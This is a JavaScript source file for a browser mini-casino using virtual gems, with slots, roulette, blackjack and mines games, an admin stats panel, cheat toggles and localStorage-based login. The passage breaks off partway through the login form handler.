// DOM Elements
const gemCount = document.getElementById('gem-count');
const getGemsBtn = document.getElementById('get-gems');
const gameCards = document.querySelectorAll('.game-card');
const playBtns = document.querySelectorAll('.play-btn');
const gameArea = document.getElementById('game-area');
const backBtn = document.getElementById('back-btn');
const currentGameTitle = document.getElementById('current-game-title');
const gameContents = document.querySelectorAll('.game-content');
const gemNotification = document.getElementById('gem-notification');
const gemNotificationText = document.getElementById('gem-notification-text');

// Mines Elements
const minesGridElement = document.querySelector('.mines-grid');
const minesCountBtns = document.querySelectorAll('.mines-count-btn');
const minesFoundDisplay = document.getElementById('gems-found');
const minesMultiplierDisplay = document.getElementById('current-multiplier');
const startMinesBtn = document.getElementById('start-mines-btn');
const cashoutBtn = document.getElementById('cashout-btn');

// Mines game functions
function updateMinesDisplay() {
    minesFoundDisplay.textContent = `0/${minesCount}`;
    const multiplier = calculateMinesMultiplier(minesCount, 0);
    minesMultiplierDisplay.textContent = multiplier.toFixed(2) + 'x';
}

function calculateMinesMultiplier(totalMines, revealed) {
    // Simple multiplier calculation based on mines and revealed cells
    const gridSize = 25; // 5x5 grid
    const safeSpots = gridSize - totalMines;
    if (revealed === 0) return 1.0;
    return parseFloat((1.0 * Math.pow(gridSize / (gridSize - totalMines), revealed)).toFixed(2));
}

function startMinesGame() {
    if (minesGameActive || gems < minesBet) return;
    
    // Deduct bet
    gems -= minesBet;
    updateGemBalance();
    
    minesGameActive = true;
    revealedCells = 0;
    currentMultiplier = 1.0;
    
    // Create mines grid
    minesGrid = Array(25).fill(false); // 5x5 grid, false = safe, true = mine
    
    // Place mines randomly
    let minesPlaced = 0;
    while (minesPlaced < minesCount) {
        const randomIndex = Math.floor(Math.random() * 25);
        if (!minesGrid[randomIndex]) {
            minesGrid[randomIndex] = true;
            minesPlaced++;
        }
    }
    
    // Create grid UI
    minesGridElement.innerHTML = '';
    for (let i = 0; i < 25; i++) {
        const cell = document.createElement('div');
        cell.className = 'mine-cell';
        cell.dataset.index = i;
        cell.addEventListener('click', () => revealCell(i));
        minesGridElement.appendChild(cell);
    }
    
    // Update UI
    startMinesBtn.disabled = true;
    cashoutBtn.disabled = false;
    minesFoundDisplay.textContent = `0/${minesCount}`;
    minesMultiplierDisplay.textContent = '1.00x';
}

function revealCell(index) {
    if (!minesGameActive) return;
    
    const cell = minesGridElement.children[index];
    if (cell.classList.contains('revealed')) return;
    
    cell.classList.add('revealed');
    
    if (minesGrid[index]) {
        // Hit a mine
        cell.innerHTML = '💣';
        cell.classList.add('mine');
        endMinesGame(false);
    } else {
        // Safe cell
        cell.innerHTML = '✓';
        revealedCells++;
        
        // Update multiplier
        currentMultiplier = calculateMinesMultiplier(minesCount, revealedCells);
        minesMultiplierDisplay.textContent = currentMultiplier.toFixed(2) + 'x';
        
        // Check if all safe cells are revealed
        if (revealedCells === 25 - minesCount) {
            endMinesGame(true);
        }
    }
}

function cashoutMines() {
    if (!minesGameActive) return;
    
    const winAmount = Math.floor(minesBet * currentMultiplier);
    gems += winAmount;
    updateGemBalance();
    
    showNotification(`+${winAmount} Gems!`, 'success');
    
    // Log win to Discord
    sendWinLogToDiscord('Mines', winAmount, minesBet, currentUser?.username);
    
    endMinesGame(true);
}

function endMinesGame(won) {
    minesGameActive = false;
    
    // Reveal all mines
    for (let i = 0; i < 25; i++) {
        if (minesGrid[i]) {
            const cell = minesGridElement.children[i];
            if (!cell.classList.contains('revealed')) {
                cell.classList.add('revealed');
                cell.innerHTML = '💣';
                if (!won) cell.classList.add('mine');
            }
        }
    }
    
    startMinesBtn.disabled = false;
    cashoutBtn.disabled = true;
    
    // Update admin stats
    adminStats.gamesPlayed++;
    if (won) {
        adminStats.wins++;
    } else {
        adminStats.losses++;
    }
    
    // Update admin panel stats if it's open
    if (document.getElementById('admin-panel').style.display === 'block') {
        updateAdminStats();
    }
    
    // Save user data
    saveUserData();
}

// User and authentication state
let currentUser = null;
let users = JSON.parse(localStorage.getItem('users')) || [];
let bannedUsers = JSON.parse(localStorage.getItem('bannedUsers')) || [];

// Game state
let gems = 1000;
let currentBet = 50; // For slots game
let slotsBet = 50; // Alias for currentBet for compatibility
let rouletteBet = 50;
let blackjackBet = 50;
let minesBet = 50;
let selectedBet = null;
let minesGameActive = false;
let minesCount = 7; // Default to match the selected button in HTML
let minesGrid = [];
let revealedCells = 0;
let currentMultiplier = 1.0;

// Initialize the game
function init() {
    // Check if user is logged in
    checkAuthentication();
    
    // Setup authentication event listeners
    setupAuthEventListeners();
    
    updateGemCount();
    setupEventListeners();
    
    // Initialize mines count buttons
    minesCountBtns.forEach(btn => {
        if (parseInt(btn.getAttribute('data-mines')) === minesCount) {
            btn.classList.add('selected');
        } else {
            btn.classList.remove('selected');
        }
    });
    
    // Set initial mines bet display
    const minesBetElement = document.getElementById('mines-current-bet');
    if (minesBetElement) {
        minesBetElement.textContent = minesBet;
    }
    
    // Initialize bet limits based on max bet
    updateBetLimits();
    
    // Load saved data first
    loadUserData();
    
    // Check if maintenance mode is enabled
if (adminStats.maintenanceMode) {
    document.getElementById('maintenance-overlay').classList.remove('hidden');
    document.getElementById('maintenance-overlay').style.display = 'flex';
    document.body.classList.add('maintenance-mode');
} else {
    document.getElementById('maintenance-overlay').classList.add('hidden');
    document.getElementById('maintenance-overlay').style.display = 'none';
    document.body.classList.remove('maintenance-mode');
}
    
    // Load user data before populating user lists in admin panel
loadUserData();
updateUserLists();
    
    // Apply maintenance mode
    if (adminStats.maintenanceMode) {
        document.getElementById('maintenance-overlay').style.display = 'flex';
    } else {
        document.getElementById('maintenance-overlay').style.display = 'none';
    }
}

// Update gem count display
function updateGemCount() {
    gemCount.textContent = gems;
    saveUserData();
}

// Alias for updateGemCount to maintain compatibility
function updateGemBalance() {
    updateGemCount();
    saveUserData();
}

// Setup event listeners
function setupEventListeners() {
    // Get free gems button
    getGemsBtn.addEventListener('click', getFreeGems);

    // Logout button
    document.getElementById('logout-button').addEventListener('click', function() {
        logout();
        showNotification('You have been logged out', 'info');
    });

    // Play buttons
    playBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const game = btn.getAttribute('data-game');
            openGame(game);
        });
    });

    // Back button
    backBtn.addEventListener('click', closeGame);

    // Slots game controls
    document.getElementById('decrease-bet').addEventListener('click', () => decreaseBet('slots'));
    document.getElementById('increase-bet').addEventListener('click', () => increaseBet('slots'));
    document.getElementById('spin-btn').addEventListener('click', spinSlots);

    // Roulette game controls
    document.getElementById('roulette-decrease-bet').addEventListener('click', () => decreaseBet('roulette'));
    document.getElementById('roulette-increase-bet').addEventListener('click', () => increaseBet('roulette'));
    document.querySelectorAll('.bet-option').forEach(option => {
        option.addEventListener('click', () => selectBet(option));
    });
    document.getElementById('spin-wheel-btn').addEventListener('click', spinRouletteWheel);

    // Blackjack game controls
    document.getElementById('blackjack-decrease-bet').addEventListener('click', () => decreaseBet('blackjack'));
    document.getElementById('blackjack-increase-bet').addEventListener('click', () => increaseBet('blackjack'));
    document.getElementById('deal-btn').addEventListener('click', dealBlackjack);
    document.getElementById('hit-btn').addEventListener('click', hitBlackjack);
    document.getElementById('stand-btn').addEventListener('click', standBlackjack);
    
    // Mines game controls
    minesCountBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (!minesGameActive) {
                minesCount = parseInt(btn.getAttribute('data-mines'));
                updateMinesDisplay();
                
                // Update selected button styling
                minesCountBtns.forEach(b => b.classList.remove('selected'));
                btn.classList.add('selected');
            }
        });
    });
    startMinesBtn.addEventListener('click', startMinesGame);
    cashoutBtn.addEventListener('click', cashoutMines);
    
    // Mines bet controls
    document.getElementById('mines-decrease-bet').addEventListener('click', () => decreaseBet('mines'));
    document.getElementById('mines-increase-bet').addEventListener('click', () => increaseBet('mines'));
    
    // Admin panel event listeners
    setupAdminPanel();
}

// Get free gems
function getFreeGems() {
    const freeGems = Math.floor(Math.random() * 100) + 50;
    gems += freeGems;
    updateGemCount();
    saveUserData();
    showNotification(`+${freeGems} Gems!`);
}

// End mines game and save data
function endMinesGame() {
    minesGameActive = false;
    updateMinesDisplay();
    saveUserData();
}

// Show notification
function showNotification(message, type = '') {
    gemNotificationText.textContent = message;
    gemNotification.classList.remove('hidden');
    
    // Reset notification styling
    gemNotification.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
    gemNotification.querySelector('i').style.color = '#00bcd4'; // Gem color
    
    // Apply styling based on notification type
    if (type === 'cheat') {
        gemNotification.style.backgroundColor = 'rgba(255, 152, 0, 0.9)';
        gemNotification.querySelector('i').className = 'fas fa-user-secret';
        gemNotification.querySelector('i').style.color = 'white';
    } else if (type === 'success') {
        gemNotification.style.backgroundColor = 'rgba(76, 175, 80, 0.8)';
    } else if (type === 'error') {
        gemNotification.style.backgroundColor = 'rgba(244, 67, 54, 0.8)';
        gemNotification.querySelector('i').className = 'fas fa-exclamation-circle';
        gemNotification.querySelector('i').style.color = 'white';
    } else if (type === 'admin') {
        gemNotification.style.backgroundColor = 'rgba(66, 133, 244, 0.9)';
        gemNotification.querySelector('i').className = 'fas fa-user-shield';
        gemNotification.querySelector('i').style.color = 'white';
    }
    
    setTimeout(() => {
        gemNotification.classList.add('hidden');
        // Reset icon if it was changed
        if (type === 'cheat' || type === 'error' || type === 'admin') {
            gemNotification.querySelector('i').className = 'fas fa-gem';
        }
    }, 3000);
}

// Open a game
function openGame(game) {
    gameArea.classList.remove('hidden');
    document.querySelector('.games-container').classList.add('hidden');
    
    // Hide all game contents
    gameContents.forEach(content => content.classList.add('hidden'));
    
    // Show the selected game
    const gameContent = document.getElementById(`${game}-game`);
    gameContent.classList.remove('hidden');
    
    // Update game title
    switch(game) {
        case 'slots':
            currentGameTitle.textContent = 'Lucky Slots';
            break;
        case 'roulette':
            currentGameTitle.textContent = 'Gem Roulette';
            break;
        case 'blackjack':
            currentGameTitle.textContent = 'Blackjack';
            break;
        case 'mines':
            currentGameTitle.textContent = 'Gem Mines';
            // Initialize mines grid if not active
            if (!minesGameActive) {
                updateMinesDisplay();
                // Create empty grid
                minesGridElement.innerHTML = '';
                for (let i = 0; i < 25; i++) {
                    const cell = document.createElement('div');
                    cell.className = 'mine-cell';
                    minesGridElement.appendChild(cell);
                }
            }
            break;
    }
}

// Close the current game
function closeGame() {
    gameArea.classList.add('hidden');
    document.querySelector('.games-container').classList.remove('hidden');
    
    // Reset game states
    resetSlots();
    resetRoulette();
    resetBlackjack();
    
    // Reset mines game if active
    if (minesGameActive) {
        endMinesGame(false);
    }
}

// Decrease bet
function decreaseBet(game) {
    let betElement;
    let currentBetValue;
    
    switch(game) {
        case 'slots':
            betElement = document.getElementById('current-bet');
            currentBetValue = currentBet;
            if (currentBet > 5) {
                currentBet -= 5;
                betElement.textContent = currentBet;
            }
            break;
        case 'roulette':
            betElement = document.getElementById('roulette-current-bet');
            currentBetValue = rouletteBet;
            if (rouletteBet > 5) {
                rouletteBet -= 5;
                betElement.textContent = rouletteBet;
            }
            break;
        case 'blackjack':
            betElement = document.getElementById('blackjack-current-bet');
            currentBetValue = blackjackBet;
            if (blackjackBet > 5) {
                blackjackBet -= 5;
                betElement.textContent = blackjackBet;
            }
            break;
        case 'mines':
            betElement = document.getElementById('mines-current-bet');
            currentBetValue = minesBet;
            if (minesBet > 5 && !minesGameActive) {
                minesBet -= 5;
                betElement.textContent = minesBet;
            }
            break;
    }
}

// Increase bet
function increaseBet(game) {
    let betElement;
    let currentBetValue;
    
    switch(game) {
        case 'slots':
            betElement = document.getElementById('current-bet');
            currentBetValue = currentBet;
            if (currentBet < 100 && gems >= currentBet + 5) {
                currentBet += 5;
                betElement.textContent = currentBet;
            }
            break;
        case 'roulette':
            betElement = document.getElementById('roulette-current-bet');
            currentBetValue = rouletteBet;
            if (rouletteBet < 100 && gems >= rouletteBet + 5) {
                rouletteBet += 5;
                betElement.textContent = rouletteBet;
            }
            break;
        case 'blackjack':
            betElement = document.getElementById('blackjack-current-bet');
            currentBetValue = blackjackBet;
            if (blackjackBet < 100 && gems >= blackjackBet + 5) {
                blackjackBet += 5;
                betElement.textContent = blackjackBet;
            }
            break;
        case 'mines':
            betElement = document.getElementById('mines-current-bet');
            currentBetValue = minesBet;
            if (minesBet < 100 && gems >= minesBet + 5 && !minesGameActive) {
                minesBet += 5;
                betElement.textContent = minesBet;
            }
            break;
    }
}

// ===== SLOTS GAME =====
const slotItems = ['🍒', '🍋', '🍇', '🍉', '🍊', '🍓', '💎'];
let isSpinning = false;

// Spin the slots
function spinSlots() {
    if (isSpinning || gems < currentBet) return;
    
    isSpinning = true;
    const resultElement = document.getElementById('slots-result');
    resultElement.textContent = '';
    resultElement.style.backgroundColor = 'transparent';
    
    // Deduct bet
    gems -= currentBet;
    updateGemCount();
    
    const slots = [
        document.getElementById('slot1').querySelector('.slot-item'),
        document.getElementById('slot2').querySelector('.slot-item'),
        document.getElementById('slot3').querySelector('.slot-item')
    ];
    
    // Animate slots
    let spins = 0;
    const maxSpins = 20;
    const spinInterval = setInterval(() => {
        slots.forEach(slot => {
            slot.textContent = slotItems[Math.floor(Math.random() * slotItems.length)];
            slot.style.transform = 'translateY(20px)';
            setTimeout(() => {
                slot.style.transform = 'translateY(0)';
            }, 50);
        });
        
        spins++;
        if (spins >= maxSpins) {
            clearInterval(spinInterval);
            checkSlotsResult(slots);
            isSpinning = false;
        }
    }, 100);
}

// Check slots result
function checkSlotsResult(slots) {
    const values = slots.map(slot => slot.textContent);
    const resultElement = document.getElementById('slots-result');
    
    // Update admin stats
    adminStats.gamesPlayed++;
    
    // Check for wins
    if (values[0] === values[1] && values[1] === values[2]) {
        // Jackpot - all three match
        let winAmount = currentBet * 10;
        if (values[0] === '💎') {
            // Diamond jackpot
            winAmount = currentBet * 25;
        }
        
        gems += winAmount;
        updateGemCount();
        sendWinLogToDiscord('Roulette', winAmount, rouletteBet, currentUser?.username);
        
        resultElement.textContent = `JACKPOT! You won ${winAmount} gems!`;
        resultElement.style.backgroundColor = 'rgba(76, 175, 80, 0.3)';
        showNotification(`+${winAmount} Gems!`, 'success');
        
        // Log win to Discord
        sendWinLogToDiscord('Slots', winAmount, currentBet, currentUser?.username);
        
        // Update admin stats
        adminStats.wins++;
    } else if (values[0] === values[1] || values[1] === values[2] || values[0] === values[2]) {
        // Two matching symbols
        const winAmount = currentBet * 2;
        gems += winAmount;
        updateGemCount();
        
        resultElement.textContent = `Two matching symbols! You won ${winAmount} gems!`;
        resultElement.style.backgroundColor = 'rgba(76, 175, 80, 0.3)';
        showNotification(`+${winAmount} Gems!`, 'success');
        
        // Log win to Discord
        sendWinLogToDiscord('Slots', winAmount, currentBet, currentUser?.username);
        
        // Update admin stats
        adminStats.wins++;
    } else {
        resultElement.textContent = 'No match. Try again!';
        resultElement.style.backgroundColor = 'rgba(244, 67, 54, 0.3)';
        showNotification('No match. Better luck next time!', 'error');
        
        // Update admin stats
        adminStats.losses++;
    }
    
    // Update admin panel stats if it's open
    if (document.getElementById('admin-panel').style.display === 'block') {
        updateAdminStats();
    }
}

// Reset slots game
function resetSlots() {
    document.getElementById('slots-result').textContent = '';
    document.getElementById('slots-result').style.backgroundColor = 'transparent';
}

// ===== ROULETTE GAME =====
let isWheelSpinning = false;

// Select bet option
function selectBet(option) {
    document.querySelectorAll('.bet-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    
    option.classList.add('selected');
    selectedBet = option.getAttribute('data-bet');
}

// Spin the roulette wheel
function spinRouletteWheel() {
    if (isWheelSpinning || !selectedBet || gems < rouletteBet) return;
    
    isWheelSpinning = true;
    const resultElement = document.getElementById('roulette-result');
    resultElement.textContent = '';
    resultElement.style.backgroundColor = 'transparent';
    
    // Deduct bet
    gems -= rouletteBet;
    updateGemCount();
    
    const wheel = document.getElementById('wheel');
    const ball = document.getElementById('ball');
    
    // Random rotation for the wheel (between 1800 and 3600 degrees)
    const wheelRotation = 1800 + Math.floor(Math.random() * 1800);
    wheel.style.transform = `rotate(${wheelRotation}deg)`;
    
    // Calculate ball position
    const ballPosition = Math.floor(Math.random() * 360);
    const ballRadius = 120; // Distance from center
    const ballX = ballRadius * Math.cos((ballPosition * Math.PI) / 180);
    const ballY = ballRadius * Math.sin((ballPosition * Math.PI) / 180);
    
    // Animate the ball
    setTimeout(() => {
        ball.style.transform = `translate(calc(-50% + ${ballX}px), calc(-50% + ${ballY}px))`;
        
        // Determine result after animation
        setTimeout(() => {
            checkRouletteResult(ballPosition);
            isWheelSpinning = false;
        }, 3000);
    }, 500);
}

// Check roulette result
function checkRouletteResult(position) {
    const resultElement = document.getElementById('roulette-result');
    let result;
    
    // Update admin stats
    adminStats.gamesPlayed++;
    
    // Determine color based on position
    if (position >= 180 && position < 190) {
        result = 'green';
    } else if (
        (position >= 0 && position < 10) ||
        (position >= 20 && position < 30) ||
        (position >= 40 && position < 50) ||
        (position >= 60 && position < 70) ||
        (position >= 80 && position < 90) ||
        (position >= 100 && position < 110) ||
        (position >= 120 && position < 130) ||
        (position >= 140 && position < 150) ||
        (position >= 160 && position < 170) ||
        (position >= 190 && position < 200) ||
        (position >= 210 && position < 220) ||
        (position >= 230 && position < 240) ||
        (position >= 250 && position < 260) ||
        (position >= 270 && position < 280) ||
        (position >= 290 && position < 300) ||
        (position >= 310 && position < 320) ||
        (position >= 330 && position < 340) ||
        (position >= 350 && position < 360)
    ) {
        result = 'red';
    } else {
        result = 'black';
    }
    
    // Check if player won
    if (result === selectedBet) {
        let winAmount;
        if (result === 'green') {
            winAmount = rouletteBet * 14; // Green pays 14:1
        } else {
            winAmount = rouletteBet * 2; // Red/Black pays 2:1
        }
        
        gems += winAmount;
        updateGemCount();
        
        resultElement.textContent = `Ball landed on ${result}. You won ${winAmount} gems!`;
        resultElement.style.backgroundColor = 'rgba(76, 175, 80, 0.3)';
        showNotification(`+${winAmount} Gems!`, 'success');
        
        // Update admin stats
        adminStats.wins++;
    } else {
        resultElement.textContent = `Ball landed on ${result}. You lost!`;
        resultElement.style.backgroundColor = 'rgba(244, 67, 54, 0.3)';
        showNotification(`Ball landed on ${result}. You lost!`, 'error');
        
        // Update admin stats
        adminStats.losses++;
    }
    
    // Update admin panel stats if it's open
    if (document.getElementById('admin-panel').style.display === 'block') {
        updateAdminStats();
    }
}

// Reset roulette game
function resetRoulette() {
    document.querySelectorAll('.bet-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    selectedBet = null;
    document.getElementById('roulette-result').textContent = '';
    document.getElementById('roulette-result').style.backgroundColor = 'transparent';
    document.getElementById('wheel').style.transform = 'rotate(0deg)';
    document.getElementById('ball').style.transform = 'translate(-50%, -50%)';
}

// ===== BLACKJACK GAME =====
const suits = ['♠', '♥', '♦', '♣'];
const values = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
let deck = [];
let dealerCards = [];
let playerCards = [];
let dealerScore = 0;
let playerScore = 0;
let gameInProgress = false;

// Create a deck of cards
function createDeck() {
    deck = [];
    for (let suit of suits) {
        for (let value of values) {
            deck.push({ suit, value });
        }
    }
    return deck;
}

// Shuffle the deck
function shuffleDeck(deck) {
    for (let i = deck.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [deck[i], deck[j]] = [deck[j], deck[i]];
    }
    return deck;
}

// Get card value
function getCardValue(card) {
    if (card.value === 'A') {
        return 11;
    } else if (['K', 'Q', 'J'].includes(card.value)) {
        return 10;
    } else {
        return parseInt(card.value);
    }
}

// Calculate hand score
function calculateScore(cards) {
    let score = 0;
    let aces = 0;
    
    for (let card of cards) {
        if (card.value === 'A') {
            aces++;
            score += 11;
        } else if (['K', 'Q', 'J'].includes(card.value)) {
            score += 10;
        } else {
            score += parseInt(card.value);
        }
    }
    
    // Adjust for aces
    while (score > 21 && aces > 0) {
        score -= 10;
        aces--;
    }
    
    return score;
}

// Create card element
function createCardElement(card) {
    const cardElement = document.createElement('div');
    cardElement.className = 'card';
    if (card.suit === '♥' || card.suit === '♦') {
        cardElement.classList.add('red');
    }
    
    const valueElement = document.createElement('div');
    valueElement.className = 'card-value';
    valueElement.textContent = card.value;
    
    const suitElement = document.createElement('div');
    suitElement.className = 'card-suit';
    suitElement.textContent = card.suit;
    
    cardElement.appendChild(valueElement);
    cardElement.appendChild(suitElement);
    
    return cardElement;
}

// Deal blackjack
function dealBlackjack() {
    if (gameInProgress || gems < blackjackBet) return;
    
    // Deduct bet
    gems -= blackjackBet;
    updateGemCount();
    
    gameInProgress = true;
    const resultElement = document.getElementById('blackjack-result');
    resultElement.textContent = '';
    resultElement.style.backgroundColor = 'transparent';
    
    // Clear cards
    document.getElementById('dealer-cards').innerHTML = '';
    document.getElementById('player-cards').innerHTML = '';
    
    // Create and shuffle deck
    deck = createDeck();
    deck = shuffleDeck(deck);
    
    // Deal initial cards
    dealerCards = [deck.pop(), deck.pop()];
    playerCards = [deck.pop(), deck.pop()];
    
    // Show dealer's first card only
    const dealerCardsElement = document.getElementById('dealer-cards');
    dealerCardsElement.appendChild(createCardElement(dealerCards[0]));
    const hiddenCard = document.createElement('div');
    hiddenCard.className = 'card';
    hiddenCard.style.backgroundColor = '#6a1b9a';
    dealerCardsElement.appendChild(hiddenCard);
    
    // Show player's cards
    const playerCardsElement = document.getElementById('player-cards');
    playerCards.forEach(card => {
        playerCardsElement.appendChild(createCardElement(card));
    });
    
    // Update scores
    dealerScore = getCardValue(dealerCards[0]);
    playerScore = calculateScore(playerCards);
    
    document.getElementById('dealer-score').textContent = `Score: ${dealerScore}`;
    document.getElementById('player-score').textContent = `Score: ${playerScore}`;
    
    // Enable hit and stand buttons
    document.getElementById('hit-btn').disabled = false;
    document.getElementById('stand-btn').disabled = false;
    document.getElementById('deal-btn').disabled = true;
    
    // Check for blackjack
    if (playerScore === 21) {
        standBlackjack();
    }
}

// Hit in blackjack
function hitBlackjack() {
    if (!gameInProgress) return;
    
    // Deal a card to the player
    const card = deck.pop();
    playerCards.push(card);
    
    // Add card to display
    const playerCardsElement = document.getElementById('player-cards');
    playerCardsElement.appendChild(createCardElement(card));
    
    // Update score
    playerScore = calculateScore(playerCards);
    document.getElementById('player-score').textContent = `Score: ${playerScore}`;
    
    // Check for bust
    if (playerScore > 21) {
        endBlackjackGame('bust');
    }
}

// Stand in blackjack
function standBlackjack() {
    if (!gameInProgress) return;
    
    // Reveal dealer's hidden card
    const dealerCardsElement = document.getElementById('dealer-cards');
    dealerCardsElement.innerHTML = '';
    dealerCards.forEach(card => {
        dealerCardsElement.appendChild(createCardElement(card));
    });
    
    // Update dealer score
    dealerScore = calculateScore(dealerCards);
    document.getElementById('dealer-score').textContent = `Score: ${dealerScore}`;
    
    // Dealer draws until 17 or higher
    const dealerDrawInterval = setInterval(() => {
        if (dealerScore < 17) {
            const card = deck.pop();
            dealerCards.push(card);
            dealerCardsElement.appendChild(createCardElement(card));
            
            dealerScore = calculateScore(dealerCards);
            document.getElementById('dealer-score').textContent = `Score: ${dealerScore}`;
        } else {
            clearInterval(dealerDrawInterval);
            
            // Determine winner
            if (dealerScore > 21) {
                endBlackjackGame('dealer_bust');
            } else if (dealerScore > playerScore) {
                endBlackjackGame('dealer_win');
            } else if (dealerScore < playerScore) {
                endBlackjackGame('player_win');
            } else {
                endBlackjackGame('push');
            }
        }
    }, 1000);
}

// End blackjack game
function endBlackjackGame(result) {
    gameInProgress = false;
    const resultElement = document.getElementById('blackjack-result');
    
    // Disable hit and stand buttons
    document.getElementById('hit-btn').disabled = true;
    document.getElementById('stand-btn').disabled = true;
    document.getElementById('deal-btn').disabled = false;
    
    let winAmount = 0;
    
    // Update admin stats
    adminStats.gamesPlayed++;
    
    switch(result) {
        case 'bust':
            resultElement.textContent = 'Bust! You went over 21. You lose!';
            resultElement.style.backgroundColor = 'rgba(244, 67, 54, 0.3)';
            showNotification('Bust! You went over 21.', 'error');
            adminStats.losses++;
            break;
        case 'dealer_bust':
            winAmount = blackjackBet * 2;
            gems += winAmount;
            updateGemCount();
            resultElement.textContent = `Dealer busts! You win ${winAmount} gems!`;
            resultElement.style.backgroundColor = 'rgba(76, 175, 80, 0.3)';
            showNotification(`+${winAmount} Gems!`, 'success');
            adminStats.wins++;
            break;
        case 'dealer_win':
            resultElement.textContent = 'Dealer wins!';
            resultElement.style.backgroundColor = 'rgba(244, 67, 54, 0.3)';
            showNotification('Dealer wins!', 'error');
            adminStats.losses++;
            break;
        case 'player_win':
            winAmount = blackjackBet * 2;
            gems += winAmount;
            updateGemCount();
            resultElement.textContent = `You win ${winAmount} gems!`;
            resultElement.style.backgroundColor = 'rgba(76, 175, 80, 0.3)';
            showNotification(`+${winAmount} Gems!`, 'success');
            adminStats.wins++;
            break;
        case 'push':
            winAmount = blackjackBet;
            gems += winAmount;
            updateGemCount();
            resultElement.textContent = 'Push! Your bet has been returned.';
            resultElement.style.backgroundColor = 'rgba(255, 193, 7, 0.3)';
            showNotification(`+${winAmount} Gems!`, 'success');
            // Push is not counted as win or loss
            break;
    }
    
    // Update admin panel stats if it's open
    if (document.getElementById('admin-panel').style.display === 'block') {
        updateAdminStats();
    }
}

// Reset blackjack game
function resetBlackjack() {
    document.getElementById('dealer-cards').innerHTML = '';
    document.getElementById('player-cards').innerHTML = '';
    document.getElementById('dealer-score').textContent = 'Score: 0';
    document.getElementById('player-score').textContent = 'Score: 0';
    document.getElementById('blackjack-result').textContent = '';
    document.getElementById('blackjack-result').style.backgroundColor = 'transparent';
    document.getElementById('hit-btn').disabled = true;
    document.getElementById('stand-btn').disabled = true;
    document.getElementById('deal-btn').disabled = false;
    gameInProgress = false;
}

// Secret Cheat Panel Functionality
let cheatsEnabled = {
    infiniteGems: false,
    minesESP: false,
    minesAutoWin: false,
    forceJackpot: false,
    forceRouletteColor: '',
    seeDealerCard: false,
    forceDealerBust: false
};

// Admin Panel Stats
let adminStats = {
    totalPlayers: 1,
    totalGems: 1000,
    gamesPlayed: 0,
    wins: 0,
    losses: 0,
    houseEdge: 5, // Default 5%
    maxBet: 100, // Default max bet
    maintenanceMode: false,
    debugMode: false
};

// Update admin panel stats display
function updateAdminStats() {
    document.getElementById('total-players').textContent = adminStats.totalPlayers;
    document.getElementById('total-gems').textContent = adminStats.totalGems;
    document.getElementById('games-played').textContent = adminStats.gamesPlayed;
    
    // Calculate win rate
    const winRate = adminStats.gamesPlayed > 0 
        ? Math.round((adminStats.wins / adminStats.gamesPlayed) * 100) 
        : 0;
    document.getElementById('win-rate').textContent = winRate + '%';
    
    // Update form values
    document.getElementById('house-edge').value = adminStats.houseEdge;
    document.getElementById('max-bet').value = adminStats.maxBet;
    document.getElementById('set-gems').value = gems;
    document.getElementById('maintenance-mode').checked = adminStats.maintenanceMode;
    document.getElementById('debug-mode').checked = adminStats.debugMode;
    
    // Save admin stats
    localStorage.setItem('adminStats', JSON.stringify(adminStats));
    
    // Apply maintenance mode
    if (adminStats.maintenanceMode) {
        document.getElementById('maintenance-overlay').style.display = 'flex';
    } else {
        document.getElementById('maintenance-overlay').style.display = 'none';
    }
    
    // Ensure all users are loaded
    updateUserLists();
}

// Save user data to localStorage
function saveUserData() {
    if (currentUser) {
        // Update current user
        currentUser.gems = gems;
        localStorage.setItem('currentUser', JSON.stringify(currentUser));
        
        // Update user in users array
        const userIndex = users.findIndex(u => u.username === currentUser.username);
        if (userIndex !== -1) {
            users[userIndex].gems = gems;
            localStorage.setItem('users', JSON.stringify(users));
        }
    }
    
    // Save admin stats
    localStorage.setItem('adminStats', JSON.stringify(adminStats));
}

// Load saved data
function loadUserData() {
    const savedAdminStats = localStorage.getItem('adminStats');
    if (savedAdminStats) {
        const stats = JSON.parse(savedAdminStats);
        adminStats = { ...adminStats, ...stats };
    }
    
    // Load users and banned users
    users = JSON.parse(localStorage.getItem('users')) || [];
    bannedUsers = JSON.parse(localStorage.getItem('bannedUsers')) || [];
    
    // Update admin stats
    adminStats.totalPlayers = users.length;
    adminStats.totalGems = users.reduce((total, user) => total + (user.gems || 0), 0);
}

// Authentication functions
function checkAuthentication() {
    // Check if user is logged in
    const savedUser = localStorage.getItem('currentUser');
    if (savedUser) {
        currentUser = JSON.parse(savedUser);
        
        // Check if user is banned
        if (bannedUsers.some(user => user.username === currentUser.username)) {
            showAuthError('Your account has been banned. Please contact support.');
            logout();
            return;
        }
        
        // Show main content
        document.getElementById('login-container').style.display = 'none';
        document.getElementById('main-content').classList.remove('hidden-auth');
        
        // Update user info
        document.getElementById('username').textContent = currentUser.username;
        gems = currentUser.gems || 1000;
        updateGemCount();
        
        // Update admin stats
        adminStats.totalPlayers = users.length;
        adminStats.totalGems = users.reduce((total, user) => total + (user.gems || 0), 0);
        updateAdminStats();
    } else {
        // Show login form
        document.getElementById('login-container').style.display = 'flex';
        document.getElementById('main-content').classList.add('hidden-auth');
    }
}

function setupAuthEventListeners() {
    // Tab switching
    document.querySelectorAll('.auth-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const tabName = tab.getAttribute('data-tab');
            
            // Update active tab
            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            
            // Show corresponding form
            document.getElementById('login-form').style.display = tabName === 'login' ? 'flex' : 'none';
            document.getElementById('signup-form').style.display = tabName === 'signup' ? 'flex' : 'none';
            
            // Hide error message
            document.getElementById('auth-error').style.display = 'none';
        });
    });
    
    // Form switching links
    document.querySelectorAll('.switch-form').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const formName = link.getAttribute('data-form');
            
            // Click the corresponding tab
            document.querySelector(`.auth-tab[data-tab="${formName}"]`).click();
        });
    });
    
    // Login form submission
    document.getElementById('login-form').addEventListener('submit', (e) => {
        e.preventDefault();
        
        const username = document.getElementById('login-username').value;
        const password = document.getElementById('login-password').value;
        
        // Find user
